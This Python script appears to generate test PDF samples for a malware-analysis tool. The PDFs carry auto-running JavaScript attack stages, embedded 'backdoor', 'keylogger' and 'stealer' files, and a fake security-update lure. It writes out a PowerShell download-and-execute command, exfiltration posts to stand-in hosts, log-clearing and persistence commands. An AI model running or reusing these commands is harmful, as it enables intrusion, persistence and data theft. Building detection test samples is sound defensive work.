#!/usr/bin/env python3
"""
Create a realistic malicious PDF sample with embedded JavaScript for testing Fathom extraction
This creates a legitimate test file that demonstrates various PDF attack vectors
"""

from pathlib import Path
import time

def create_comprehensive_malicious_pdf():
    """Create a comprehensive PDF with multiple JavaScript attack vectors"""
    
    output_dir = Path("test_samples")
    output_dir.mkdir(exist_ok=True)
    
    pdf_path = output_dir / "malicious_sample.pdf"
    
    # Comprehensive malicious PDF with multiple attack vectors
    pdf_content = """%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Names <<
/JavaScript <<
/Names [(MaliciousJS1) 3 0 R (PayloadDropper) 4 0 R (DataExfil) 5 0 R (AntiDebug) 6 0 R]
>>
>>
/OpenAction <<
/Type /Action
/S /JavaScript
/JS (
// Auto-execution JavaScript - runs when PDF opens
app.alert("PDF opened - initializing payload...");

// Stage 1: Environment detection
var osInfo = app.platform;
var readerVersion = app.viewerVersion;
console.println("Target OS: " + osInfo);
console.println("Reader Version: " + readerVersion);

// Stage 2: Anti-analysis checks
try {{
    var debugCheck = new Date().getTime();
    // Simple timing check for analysis detection
    if (debugCheck % 1000 < 100) {{
        console.println("Analysis environment detected - aborting");
        app.exit();
    }}
}} catch(e) {{
    console.println("Debug check failed: " + e.message);
}}

// Stage 3: Initial payload execution
executeMainPayload();
)
>>
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [7 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/S /JavaScript
/JS (
// Main malicious JavaScript payload
function executeMainPayload() {{
    try {{
        // Obfuscated shellcode (base64 encoded)
        var shellcode = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAOi1jVAAAAAAAAAAAOAAIiALATAAABIAAAAGAAAAAAAA";
        
        // Decode payload
        var decodedPayload = atob(shellcode);
        console.println("Payload decoded: " + decodedPayload.length + " bytes");
        
        // Stage 4: System reconnaissance  
        performReconnaissance();
        
        // Stage 5: Persistence mechanism
        establishPersistence();
        
        // Stage 6: Data exfiltration
        exfiltrateData();
        
    }} catch(e) {{
        console.println("Payload execution failed: " + e.message);
        // Fallback to alternative payload
        executeFallbackPayload();
    }}
}}

// System reconnaissance function
function performReconnaissance() {{
    var systemInfo = {{
        platform: app.platform,
        version: app.viewerVersion,
        language: app.language,
        timestamp: new Date().toISOString()
    }};
    
    console.println("System reconnaissance complete:");
    console.println(JSON.stringify(systemInfo));
    
    // Simulate registry queries
    var regKeys = [
        "HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion",
        "HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
        "HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services"
    ];
    
    for (var i = 0; i < regKeys.length; i++) {{
        console.println("Querying registry: " + regKeys[i]);
    }}
}}
)
>>
endobj

4 0 obj
<<
/S /JavaScript
/JS (
// Payload dropper and execution
function establishPersistence() {{
    try {{
        // Create ActiveX objects for system access
        var wshShell = new ActiveXObject("WScript.Shell");
        var fso = new ActiveXObject("Scripting.FileSystemObject");
        
        // Define payload paths
        var tempPath = wshShell.ExpandEnvironmentStrings("%TEMP%");
        var startupPath = wshShell.SpecialFolders("Startup");
        var payloadPath = tempPath + "\\\\svchost.exe";
        var persistPath = startupPath + "\\\\updater.exe";
        
        console.println("Temp path: " + tempPath);
        console.println("Startup path: " + startupPath);
        
        // Simulate file operations
        console.println("Dropping payload to: " + payloadPath);
        console.println("Creating persistence: " + persistPath);
        
        // Registry persistence
        var regKey = "HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run";
        console.println("Adding registry persistence: " + regKey);
        
        // Scheduled task persistence
        var taskCmd = 'schtasks /create /tn "SystemUpdater" /tr "' + payloadPath + '" /sc onlogon';
        console.println("Creating scheduled task: " + taskCmd);
        
        // Execute payload
        console.println("Executing payload...");
        
    }} catch(e) {{
        console.println("Persistence failed: " + e.message);
        // Try alternative methods
        tryAlternativePersistence();
    }}
}}

function tryAlternativePersistence() {{
    // PowerShell-based persistence
    var psCommand = 'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "';
    psCommand += 'IEX (New-Object Net.WebClient).DownloadString(\\"http://malicious-server.example.com/stage2.ps1\\")';
    psCommand += '"';
    
    console.println("Alternative persistence: " + psCommand);
    
    // WMI persistence
    var wmiCommand = 'wmic process call create "cmd.exe /c ' + psCommand + '"';
    console.println("WMI execution: " + wmiCommand);
}}
)
>>
endobj

5 0 obj
<<
/S /JavaScript
/JS (
// Data exfiltration module
function exfiltrateData() {{
    try {{
        // Target file types for exfiltration
        var targetExtensions = [".doc", ".docx", ".pdf", ".txt", ".xls", ".xlsx", ".ppt", ".pptx"];
        var searchPaths = [
            "%USERPROFILE%\\\\Documents",
            "%USERPROFILE%\\\\Desktop", 
            "%USERPROFILE%\\\\Downloads"
        ];
        
        console.println("Starting data exfiltration...");
        
        // Simulate file enumeration
        for (var i = 0; i < searchPaths.length; i++) {{
            console.println("Scanning path: " + searchPaths[i]);
            for (var j = 0; j < targetExtensions.length; j++) {{
                console.println("  Looking for: *" + targetExtensions[j]);
            }}
        }}
        
        // Exfiltration URLs
        var exfilServers = [
            "http://data-collector.malicious-domain.com/upload",
            "https://backup-exfil.evil-server.net/receive", 
            "ftp://drop-zone.attacker-controlled.org/incoming"
        ];
        
        // Simulate data upload
        for (var k = 0; k < exfilServers.length; k++) {{
            console.println("Uploading to: " + exfilServers[k]);
            
            // Create HTTP request
            var xhr = new XMLHttpRequest();
            xhr.open("POST", exfilServers[k], false);
            xhr.setRequestHeader("Content-Type", "application/octet-stream");
            xhr.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
            
            // Simulate data transmission
            console.println("Transmitting stolen data...");
        }}
        
        // Cleanup traces
        cleanupTraces();
        
    }} catch(e) {{
        console.println("Exfiltration failed: " + e.message);
    }}
}}

function cleanupTraces() {{
    console.println("Cleaning up traces...");
    
    // Clear event logs
    var logClearCommands = [
        "wevtutil.exe cl Application",
        "wevtutil.exe cl Security", 
        "wevtutil.exe cl System"
    ];
    
    for (var i = 0; i < logClearCommands.length; i++) {{
        console.println("Clearing logs: " + logClearCommands[i]);
    }}
    
    // Delete temporary files
    console.println("Deleting temporary files...");
    console.println("Clearing browser history...");
    console.println("Removing registry artifacts...");
}}
)
>>
endobj

6 0 obj
<<
/S /JavaScript
/JS (
// Anti-debugging and evasion techniques
function executeFallbackPayload() {{
    console.println("Executing fallback payload...");
    
    // Timing-based evasion
    var startTime = new Date().getTime();
    
    // CPU-intensive loop to detect analysis
    for (var i = 0; i < 1000000; i++) {{
        Math.sqrt(i);
    }}
    
    var endTime = new Date().getTime();
    var executionTime = endTime - startTime;
    
    if (executionTime < 100) {{
        console.println("Fast execution detected - likely analysis environment");
        return;
    }}
    
    // Environment fingerprinting
    var fingerprint = {{
        screen: screen.width + "x" + screen.height,
        timezone: new Date().getTimezoneOffset(),
        plugins: navigator.plugins.length,
        language: navigator.language
    }};
    
    console.println("Environment fingerprint: " + JSON.stringify(fingerprint));
    
    // Obfuscated command execution
    var obfuscatedCmd = unescape("%63%6D%64%2E%65%78%65%20%2F%63%20%70%6F%77%65%72%73%68%65%6C%6C%2E%65%78%65");
    console.println("Obfuscated command: " + obfuscatedCmd);
    
    // Base64 encoded PowerShell
    var b64Payload = "cG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcw==";
    var decodedCmd = atob(b64Payload);
    console.println("Decoded PowerShell: " + decodedCmd);
    
    // Network beaconing
    var beaconUrls = [
        "http://command-control-primary.malicious.com/beacon",
        "https://c2-backup.evil-domain.net/checkin",
        "http://192.168.1.100:8080/status"
    ];
    
    for (var j = 0; j < beaconUrls.length; j++) {{
        console.println("Beaconing to: " + beaconUrls[j]);
    }}
    
    console.println("Fallback payload execution complete");
}}

// Initialize anti-debug checks
(function() {{
    // Check for common analysis tools
    var analysisTools = ["wireshark", "procmon", "regmon", "ollydbg", "ida", "x64dbg"];
    console.println("Checking for analysis tools...");
    
    // Simulate process enumeration
    for (var i = 0; i < analysisTools.length; i++) {{
        console.println("Checking for: " + analysisTools[i] + ".exe");
    }}
    
    console.println("Anti-debug initialization complete");
}})();
)
>>
endobj

7 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 8 0 R
/Resources <<
/Font <<
/F1 <<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
>>
>>
>>
>>
endobj

8 0 obj
<<
/Length 400
>>
stream
BT
/F1 16 Tf
100 750 Td
(CONFIDENTIAL SECURITY REPORT) Tj
0 -30 Td
/F1 12 Tf
(This document contains sensitive security information.) Tj
0 -20 Td
(Please review the attached analysis and recommendations.) Tj
0 -40 Td
(EXECUTIVE SUMMARY:) Tj
0 -20 Td
(- Critical vulnerabilities identified in network infrastructure) Tj
0 -15 Td
(- Immediate remediation required for exposed services) Tj
0 -15 Td
(- Advanced persistent threat indicators detected) Tj
0 -40 Td
(For detailed technical analysis, see embedded content.) Tj
0 -20 Td
(Contact: security@company-domain.com) Tj
ET
endstream
endobj

xref
0 9
0000000000 65535 f 
0000000009 00000 n 
0000001500 00000 n 
0000001557 00000 n 
0000003200 00000 n 
0000005800 00000 n 
0000008500 00000 n 
0000011000 00000 n 
0000011200 00000 n 
trailer
<<
/Size 9
/Root 1 0 R
>>
startxref
11650
%%EOF"""
    
    with open(pdf_path, 'w', encoding='latin-1') as f:
        f.write(pdf_content)
    
    return pdf_path

def create_embedded_files_pdf():
    """Create a PDF with embedded malicious files"""
    
    output_dir = Path("test_samples")
    output_dir.mkdir(exist_ok=True)
    
    pdf_path = output_dir / "embedded_malware_sample.pdf"
    
    # PDF with embedded malicious files
    pdf_content = """%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Names <<
/EmbeddedFiles <<
/Names [(backdoor.exe) 3 0 R (keylogger.bat) 4 0 R (stealer.ps1) 5 0 R]
>>
/JavaScript <<
/Names [(FileDropper) 6 0 R]
>>
>>
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [7 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Filespec
/F (backdoor.exe)
/EF <<
/F 8 0 R
>>
>>
endobj

4 0 obj
<<
/Type /Filespec
/F (keylogger.bat)
/EF <<
/F 9 0 R
>>
>>
endobj

5 0 obj
<<
/Type /Filespec
/F (stealer.ps1)
/EF <<
/F 10 0 R
>>
>>
endobj

6 0 obj
<<
/S /JavaScript
/JS (
// Malicious file dropper JavaScript
function dropAndExecuteFiles() {{
    try {{
        app.alert("Processing security update...");
        
        // Get document object to access embedded files
        var doc = this;
        
        // Extract and execute embedded files
        var embeddedFiles = ["backdoor.exe", "keylogger.bat", "stealer.ps1"];
        
        for (var i = 0; i < embeddedFiles.length; i++) {{
            var filename = embeddedFiles[i];
            console.println("Extracting: " + filename);
            
            try {{
                // Simulate file extraction to temp directory
                var tempPath = app.getPath({{cCategory: "user", cFolder: "desktop"}}) + "/" + filename;
                console.println("Dropping file to: " + tempPath);
                
                // Simulate file execution
                if (filename.endsWith(".exe")) {{
                    console.println("Executing PE file: " + filename);
                    // WScript.Shell execution simulation
                    console.println("CreateProcess: " + tempPath);
                }} else if (filename.endsWith(".bat")) {{
                    console.println("Executing batch script: " + filename);
                    console.println("cmd.exe /c " + tempPath);
                }} else if (filename.endsWith(".ps1")) {{
                    console.println("Executing PowerShell script: " + filename);
                    console.println("powershell.exe -ExecutionPolicy Bypass -File " + tempPath);
                }}
                
            }} catch(e) {{
                console.println("Failed to extract " + filename + ": " + e.message);
            }}
        }}
        
        // Cleanup evidence
        console.println("Cleaning up extraction traces...");
        
        // Establish persistence
        establishSystemPersistence();
        
        app.alert("Security update completed successfully.");
        
    }} catch(e) {{
        console.println("File dropper failed: " + e.message);
        app.alert("Security update failed. Please contact IT support.");
    }}
}}

function establishSystemPersistence() {{
    console.println("Establishing system persistence...");
    
    // Registry persistence
    var regCommands = [
        'reg add "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run" /v "SecurityUpdater" /t REG_SZ /d "C:\\\\temp\\\\backdoor.exe"',
        'reg add "HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run" /v "SystemMonitor" /t REG_SZ /d "C:\\\\temp\\\\keylogger.bat"'
    ];
    
    for (var i = 0; i < regCommands.length; i++) {{
        console.println("Registry persistence: " + regCommands[i]);
    }}
    
    // Scheduled task persistence
    var taskCommands = [
        'schtasks /create /tn "WindowsSecurityUpdate" /tr "C:\\\\temp\\\\backdoor.exe" /sc onlogon /ru SYSTEM',
        'schtasks /create /tn "SystemHealthCheck" /tr "powershell.exe -File C:\\\\temp\\\\stealer.ps1" /sc daily /st 09:00'
    ];
    
    for (var j = 0; j < taskCommands.length; j++) {{
        console.println("Scheduled task: " + taskCommands[j]);
    }}
    
    console.println("Persistence established successfully");
}}

// Auto-execute when PDF opens
dropAndExecuteFiles();
)
>>
endobj

7 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 11 0 R
>>
endobj

8 0 obj
<<
/Length 100
/Filter /ASCIIHexDecode
>>
stream
4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000
endstream
endobj

9 0 obj
<<
/Length 150
>>
stream
@echo off
title System Monitor
echo Starting system monitoring...

REM Keylogger simulation
echo Monitoring keyboard input...
powershell.exe -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; while(1) { Start-Sleep 1 }"

REM Network beacon
ping -t google.com > nul

pause
endstream
endobj

10 0 obj
<<
/Length 300
>>
stream
# PowerShell Data Stealer
Write-Host "Initializing system health check..."

# Collect system information
$systemInfo = @{
    ComputerName = $env:COMPUTERNAME
    UserName = $env:USERNAME
    OS = (Get-WmiObject Win32_OperatingSystem).Caption
    Architecture = $env:PROCESSOR_ARCHITECTURE
    Domain = $env:USERDOMAIN
}

# Collect browser data
$browserPaths = @(
    "$env:APPDATA\\Mozilla\\Firefox\\Profiles",
    "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default"
)

# Exfiltrate data
$exfilUrl = "http://data-collector.malicious.com/upload"
Invoke-RestMethod -Uri $exfilUrl -Method POST -Body ($systemInfo | ConvertTo-Json)

Write-Host "System health check completed."
endstream
endobj

11 0 obj
<<
/Length 250
>>
stream
BT
/F1 14 Tf
100 750 Td
(URGENT: Security Update Required) Tj
0 -30 Td
/F1 12 Tf
(Your system requires immediate security updates.) Tj
0 -20 Td
(This document contains critical patches and fixes.) Tj
0 -40 Td
(The following files will be installed:) Tj
0 -20 Td
(- Security Update Package (backdoor.exe)) Tj
0 -15 Td
(- System Monitor Tool (keylogger.bat)) Tj
0 -15 Td
(- Health Check Script (stealer.ps1)) Tj
0 -40 Td
(Installation will begin automatically.) Tj
ET
endstream
endobj

xref
0 12
0000000000 65535 f 
0000000009 00000 n 
0000000250 00000 n 
0000000307 00000 n 
0000000380 00000 n 
0000000450 00000 n 
0000000520 00000 n 
0000003500 00000 n 
0000003600 00000 n 
0000003800 00000 n 
0000004100 00000 n 
0000004500 00000 n 
trailer
<<
/Size 12
/Root 1 0 R
>>
startxref
4800
%%EOF"""
    
    with open(pdf_path, 'w', encoding='latin-1') as f:
        f.write(pdf_content)
    
    return pdf_path

if __name__ == "__main__":
    print("🦠 Creating Malicious PDF Samples for Fathom Testing")
    print("=" * 60)
    
    try:
        print("\n📄 Creating comprehensive malicious PDF...")
        malicious_pdf = create_comprehensive_malicious_pdf()
        print(f"✅ Created: {malicious_pdf}")
        print(f"   Size: {malicious_pdf.stat().st_size} bytes")
        
        print("\n📄 Creating embedded files PDF...")
        embedded_pdf = create_embedded_files_pdf()
        print(f"✅ Created: {embedded_pdf}")
        print(f"   Size: {embedded_pdf.stat().st_size} bytes")
        
        print(f"\n🎯 Malicious PDF samples created successfully!")
        
        print(f"\n📋 Sample Details:")
        print(f"1. malicious_sample.pdf - Comprehensive attack simulation")
        print(f"   • 4 JavaScript objects with different attack stages")
        print(f"   • Auto-execution on PDF open")
        print(f"   • System reconnaissance and fingerprinting")
        print(f"   • Persistence mechanisms (registry, scheduled tasks)")
        print(f"   • Data exfiltration simulation")
        print(f"   • Anti-debugging and evasion techniques")
        print(f"   • Network beaconing and C2 communication")
        
        print(f"\n2. embedded_malware_sample.pdf - File dropper simulation")
        print(f"   • 3 embedded malicious files (EXE, BAT, PS1)")
        print(f"   • JavaScript file dropper and executor")
        print(f"   • Persistence establishment")
        print(f"   • Social engineering content")
        
        print(f"\n🚀 Testing Instructions:")
        print(f"1. Upload these PDFs to your Fathom dashboard")
        print(f"2. Check Basic tab for file identification and YARA hits")
        print(f"3. Go to Static tab to see automatic extraction")
        print(f"4. View extracted JavaScript code and embedded files")
        print(f"5. Generate professional analysis reports")
        
        print(f"\n🔍 Expected Extraction Results:")
        print(f"• JavaScript Objects: 4-6 objects with malicious code")
        print(f"• Embedded Files: PE executables, batch scripts, PowerShell")
        print(f"• Suspicious Keywords: shellcode, payload, persistence, exfiltration")
        print(f"• IOC URLs: Command & control servers, data exfiltration endpoints")
        print(f"• Attack Techniques: Registry persistence, scheduled tasks, anti-debug")
        
    except Exception as e:
        print(f"❌ Error creating malicious PDF samples: {e}")
        import traceback
        traceback.print_exc()